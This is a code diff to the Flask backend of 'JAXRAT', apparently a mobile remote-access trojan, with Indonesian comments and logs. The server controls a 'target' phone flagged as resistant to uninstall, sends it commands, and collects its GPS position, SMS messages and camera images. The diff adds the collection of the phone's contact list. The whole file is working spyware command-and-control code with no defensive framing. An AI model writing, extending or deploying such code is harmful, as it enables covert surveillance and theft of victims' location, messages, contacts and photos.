@@ -7,14 +7,10 @@ app.secret_key = 'jaxrat_secret_key_v1_sangat_rahasia'
 USERNAME = "admin"
 PASSWORD = "jaxrat123"
 
-devices = {
-    "hp_target_1": {"name": "HP Target", "status": "online", "last_seen": "-", "anti_uninstall": True}
-}
-
+devices = {"hp_target_1": {"name": "HP Target", "status": "online", "last_seen": "-", "anti_uninstall": True}}
 latest_commands = {"hp_target_1": "none"}
-latest_results = {"hp_target_1": {"gps": "Belum ada data", "sms": []}}
+latest_results = {"hp_target_1": {"gps": "Belum ada data", "sms": [], "contacts": []}}
 
-# --- SETUP FOLDER UPLOAD ---
 UPLOAD_FOLDER = os.path.join(app.root_path, 'static', 'uploads')
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
@@ -43,14 +39,13 @@ def device_panel(device_id):
     if device_id not in devices: return "Perangkat tidak ditemukan", 404
     return render_template('panel.html', device_id=device_id, device=devices[device_id])
 
-# --- ENDPOINT KONTROL ---
 @app.route('/api/command/<device_id>', methods=['POST'])
 def receive_command(device_id):
     if not session.get('logged_in'): return jsonify({"status": "error"}), 401
     data = request.json
     cmd = data.get("command")
     latest_commands[device_id] = cmd
-    print(f"[JAXRAT] Perintah masuk untuk {device_id}: {cmd}")
+    print(f"[JAXRAT] Perintah masuk: {cmd}")
     return jsonify({"status": "success", "received": cmd})
 
 @app.route('/api/get_command/<device_id>', methods=['GET'])
@@ -59,19 +54,20 @@ def get_command(device_id):
     latest_commands[device_id] = "none"
     return jsonify({"command": cmd})
 
-# --- ENDPOINT SPY TEKS (GPS & SMS) ---
 @app.route('/api/upload_result/<device_id>', methods=['POST'])
 def upload_result(device_id):
     data = request.json
     if device_id in latest_results:
         if data.get("type") == "gps":
             latest_results[device_id]["gps"] = data.get("data")
-            print(f"[SPY] GPS masuk dari {device_id}: {data.get('data')}")
+            print(f"[SPY] GPS masuk: {data.get('data')}")
         elif data.get("type") == "sms":
             latest_results[device_id]["sms"] = data.get("data")
-            print(f"[SPY] {len(data.get('data'))} SMS masuk dari {device_id}")
-        elif data.get("type") == "camera_error": # <--- TAMBAHKAN INI
-            latest_results[device_id]["camera_error"] = data.get("data")
+            print(f"[SPY] {len(data.get('data'))} SMS masuk")
+        elif data.get("type") == "contacts":
+            latest_results[device_id]["contacts"] = data.get("data")
+            print(f"[SPY] {len(data.get('data'))} Kontak masuk")
+        elif data.get("type") == "camera_error":
             print(f"[ERROR KAMERA] {data.get('data')}")
     return jsonify({"status": "success"})
 
@@ -86,23 +82,18 @@ def clear_result(device_id, result_type):
     if device_id in latest_results:
         if result_type == "gps": latest_results[device_id]["gps"] = "Belum ada data"
         elif result_type == "sms": latest_results[device_id]["sms"] = []
+        elif result_type == "contacts": latest_results[device_id]["contacts"] = []
     return jsonify({"status": "success"})
 
-# --- ENDPOINT UPLOAD GAMBAR (KAMERA) ---
 @app.route('/api/upload_image/<device_id>', methods=['POST'])
 def upload_image(device_id):
     if 'image' not in request.files:
         return jsonify({"status": "error", "message": "No image part"}), 400
-    
     file = request.files['image']
-    if file.filename == '':
-        return jsonify({"status": "error", "message": "No selected file"}), 400
-    
-    # Simpan sebagai latest.jpg (nimpa file lama biar hemat storage)
+    if file.filename == '': return jsonify({"status": "error"}), 400
     filepath = os.path.join(UPLOAD_FOLDER, 'latest.jpg')
     file.save(filepath)
     print(f"[SPY] Gambar baru diterima dari {device_id}!")
-    
     return jsonify({"status": "success"})
 
 if __name__ == '__main__':
